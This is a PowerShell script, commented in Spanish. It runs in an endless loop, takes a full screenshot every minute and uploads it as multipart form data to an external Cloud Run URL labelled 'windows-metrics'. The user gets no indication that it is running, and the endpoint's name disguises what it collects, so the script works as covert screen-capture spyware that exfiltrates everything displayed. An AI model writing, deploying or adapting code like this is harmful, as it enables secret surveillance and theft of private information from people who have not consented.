# Configuración
$url = "https://windows-metrics-389205780371.us-east1.run.app/metrics"
$tempPath = "$env:TEMP\screenshot.png"
$intervaloSegundos = 60 # 1 minuto

# Asegurar la carga de la librería para gráficos
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
    try {
        # 1. Obtener la resolución de la pantalla principal
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        # 2. Crear el mapa de bits y capturar la pantalla
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        
        # 3. Guardar la imagen localmente
        $bmp.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        # Liberar recursos de memoria de la captura anterior
        $graphics.Dispose()
        $bmp.Dispose()

        # 4. Enviar el archivo mediante Multipart FormData (equivalente al curl --form)
        $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
        $fileName = [System.IO.Path]::GetFileName($tempPath)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = (
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"image`"; filename=`"$fileName`"`r`n" +
            "Content-Type: image/png`r`n`r`n" +
            [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes) + "`r`n" +
            "--$boundary--`r`n"
        )

        $contentType = "multipart/form-data; boundary=$boundary"
        
        # Realizar la petición POST
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $contentType

    }
    catch {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error: $_" -ForegroundColor Red
    }

    # Esperar 1 minuto antes de la siguiente iteración
    Start-Sleep -Seconds $intervaloSegundos
}